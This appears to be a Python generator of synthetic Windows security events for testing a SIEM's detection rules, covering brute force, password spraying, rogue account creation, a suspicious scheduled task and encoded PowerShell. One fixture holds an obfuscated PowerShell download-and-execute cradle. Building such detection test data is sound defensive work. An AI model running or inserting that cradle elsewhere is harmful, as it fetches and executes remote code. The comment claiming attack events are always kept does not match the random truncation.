"""
Sample Windows security event generator for the SIEM backend.

Produces realistic Windows Security / Sysmon events designed to trigger the
built-in detection rules, plus enough benign background events to look like a
real workstation/DC environment.
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List

# ── Environment ───────────────────────────────────────────────────────────────

ACCOUNTS = [
    "jsmith", "mrodriguez", "a.kim", "r.patel", "tnguyen", "svc_backup",
    "svc_monitoring", "d.turner", "admin", "k.chen",
]

COMPUTERS = [
    "WS-001", "WS-002", "WS-003", "WS-004", "DC01", "SRV-FILE01", "SRV-WEB01",
]

INTERNAL_IPS = [
    "192.168.1.10", "192.168.1.11", "192.168.1.12", "192.168.1.50",
    "192.168.1.101", "10.0.0.5", "10.0.0.22",
]

EXTERNAL_IPS = [
    "45.77.12.204", "185.220.101.34", "103.75.200.130", "91.219.236.88",
    "198.98.54.12",
]


def _now() -> datetime:
    return datetime.now(timezone.utc)


def _iso(ts: datetime) -> str:
    return ts.isoformat()


def _make_event(
    ts: datetime,
    event_id: int,
    account: str,
    event_type: str,
    severity: str,
    source_ip: str = None,
    computer_name: str = None,
    raw: Dict[str, Any] = None,
) -> Dict[str, Any]:
    return {
        "timestamp": _iso(ts),
        "event_id": event_id,
        "source": "Windows Security",
        "account": account,
        "source_ip": source_ip,
        "computer_name": computer_name or random.choice(COMPUTERS),
        "event_type": event_type,
        "severity": severity,
        "raw_data": raw or {},
    }


def generate_sample_events(count: int = 400, seed: int | None = None) -> List[Dict[str, Any]]:
    """Generate *count* realistic events, some of which trigger detections."""
    if seed is not None:
        random.seed(seed)

    events: List[Dict[str, Any]] = []
    now = _now()
    start = now - timedelta(hours=6)

    # ── Background benign events ────────────────────────────────────────────
    for i in range(max(80, count // 3)):
        ts = start + timedelta(seconds=random.randint(0, 6 * 3600))
        account = random.choice(ACCOUNTS)
        kind = random.choices(
            ["4624", "4634", "4663", "4688", "4720"],
            weights=[45, 20, 15, 15, 5],
        )[0]
        if kind == "4624":  # successful logon (benign)
            events.append(_make_event(
                ts, 4624, account, "Authentication", "Info",
                source_ip=random.choice(INTERNAL_IPS),
                raw={"logon_type": 2, "logon_process": "Kerberos"},
            ))
        elif kind == "4634":  # logoff
            events.append(_make_event(
                ts, 4634, account, "Authentication", "Info",
                source_ip=random.choice(INTERNAL_IPS),
                raw={"logon_type": 2},
            ))
        elif kind == "4663":  # object access
            events.append(_make_event(
                ts, 4663, account, "File", "Info",
                source_ip=random.choice(INTERNAL_IPS),
                raw={"object": "C:\\Shared\\report.docx", "access": "Read"},
            ))
        elif kind == "4688":  # benign process create
            events.append(_make_event(
                ts, 4688, account, "Process", "Info",
                raw={"process_name": "explorer.exe",
                     "command_line": "C:\\Windows\\explorer.exe"},
            ))
        else:  # account creation during business hours (benign)
            events.append(_make_event(
                ts, 4720, account, "Account", "Info",
                source_ip=random.choice(INTERNAL_IPS),
                raw={"creator": random.choice(ACCOUNTS)},
            ))

    # ── Attack 1: Brute force + successful login ───────────────────────────
    victim = "svc_backup"
    attacker_ip = random.choice(EXTERNAL_IPS)
    brute_start = start + timedelta(minutes=95)
    for i in range(8):
        ts = brute_start + timedelta(minutes=i * 1)
        events.append(_make_event(
            ts, 4625, victim, "Authentication", "Medium",
            source_ip=attacker_ip,
            raw={"logon_type": 3, "failure_reason": "Unknown user name or bad password",
                 "auth_package": "NTLM"},
        ))
    # Successful login after the failures
    events.append(_make_event(
        brute_start + timedelta(minutes=9), 4624, victim, "Authentication", "High",
        source_ip=attacker_ip,
        raw={"logon_type": 3, "logon_process": "NtLmSsp"},
    ))

    # ── Attack 2: Account creation at night + privilege assignment ─────────
    night = _now().replace(hour=2, minute=41, second=0, microsecond=0)
    if night > now:
        night = night - timedelta(days=1)
    new_acct = "temp_support"
    events.append(_make_event(
        night, 4720, new_acct, "Account", "High",
        source_ip="10.0.0.5",
        raw={"creator": "admin"},
    ))
    events.append(_make_event(
        night + timedelta(minutes=4), 4672, new_acct, "Privilege", "High",
        source_ip="10.0.0.5",
        raw={"privileges": ["SeDebugPrivilege", "SeTcbPrivilege"]},
    ))

    # ── Attack 3: Suspicious PowerShell ────────────────────────────────────
    ps_ts = start + timedelta(minutes=170)
    events.append(_make_event(
        ps_ts, 4688, "admin", "PowerShell", "High",
        raw={
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuACcAKQA=",
        },
    ))

    # ── Attack 4: Scheduled task created at night ──────────────────────────
    st_ts = night + timedelta(minutes=18)
    events.append(_make_event(
        st_ts, 4698, new_acct, "Persistence", "Medium",
        source_ip="10.0.0.5",
        raw={"task_name": "WindowsUpdateCheck",
             "command": "C:\\Windows\\Temp\\svchost.exe -c"},
    ))

    # ── Attack 5: second brute-force target (password spray) ───────────────
    spray_ip = random.choice(EXTERNAL_IPS)
    for i, acct in enumerate(["jsmith", "mrodriguez", "a.kim", "r.patel"]):
        ts = start + timedelta(minutes=260 + i * 3)
        for j in range(3):
            events.append(_make_event(
                ts + timedelta(minutes=j), 4625, acct, "Authentication", "Medium",
                source_ip=spray_ip,
                raw={"logon_type": 3, "failure_reason": "Unknown user name or bad password"},
            ))

    # Trim to the requested count (keep attack events; drop benign first)
    random.shuffle(events)
    # Keep all events but return requested count
    if len(events) > count:
        events = events[:count]

    events.sort(key=lambda e: e["timestamp"])
    return events
